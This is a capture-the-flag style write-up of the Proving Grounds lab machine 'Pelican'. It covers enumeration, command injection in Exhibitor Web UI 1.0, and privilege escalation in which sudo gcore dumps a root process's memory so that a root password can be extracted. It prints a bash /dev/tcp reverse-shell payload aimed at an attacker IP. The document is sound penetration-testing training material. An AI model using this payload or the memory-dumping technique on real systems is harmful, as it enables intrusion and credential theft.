---
description: Writeup for Pelican from Offensive Security Proving Grounds (PG)
---

# Pelican

## Service Enumeration

`nmapAutomator.sh -H 192.168.237.98 -t full`

`nmapAutomator.sh -H 192.168.237.98 -t vulns`

![](../../.gitbook/assets/b1e9cd148fff41af9a1a5c311498a19f.png)

## Exploitation

Going to port 8081 redirects us to this page at port 8080.

![](../../.gitbook/assets/a79a90aa19f44cc1845bd80c0a385389.png)

This is an Exhibitor Web UI. We can see from the top right corner of the page that the version is 1.0, which is vulnerable to an OS command injection vulnerability: [https://www.exploit-db.com/exploits/48654](https://www.exploit-db.com/exploits/48654).

In the Config tab, the `java.env script` field can be used to execute arbitrary commands. For instance, we can trigger a reverse shell with `$(bash -i >& /dev/tcp/192.168.49.237/4242 0>&1)`

![](../../.gitbook/assets/174467a8d34340ab9405e1ddb0fc1f6c.png)

Catching the reverse shell:

![](../../.gitbook/assets/25366397daf24093ba85e7c05835e755.png)

Proof:

![](../../.gitbook/assets/722dc85417d740bfb583de190bab4836.png)

## Privilege Escalation

From the LinPEAS output, we find that `root` runs a binary `/usr/bin/password-store`. We don't have permissions to run this, but it looks interesting.

![](../../.gitbook/assets/ed6a246fd620478a8df1c0c7f3561fe7.png)

Now, we find that we can run `gcore` as root with no password.

![](../../.gitbook/assets/59576d9c0c274f77ad361f2eb6360d05.png)

Reference: [https://wiki.sentnl.io/security/hacking-demos/getting-passwords-of-logged-in-users](https://wiki.sentnl.io/security/hacking-demos/getting-passwords-of-logged-in-users)

`gcore` creates a core dump of a running process. A core file or core dump is a file that records the memory image of a running process and its process status.

Using `ps -ef | grep password-store`, we find that the process ID is 493. Then, we can run `gcore` as `sudo` to create a core dump of the process.

![](../../.gitbook/assets/8c0835d98019479e8d347ec35fa30dbf.png)

In the strings output \(`strings core.493`\), we find something interesting.

![](../../.gitbook/assets/a7703a46bd1047b6bdc578069c741e17.png)

Using this root password, we successfully authenticate as root.

![](../../.gitbook/assets/d7367e2cbfd44e75a48f409e87f76b03.png)

![](../../.gitbook/assets/31860bf4e7714d04b428b68f2dbeb9c4.png)

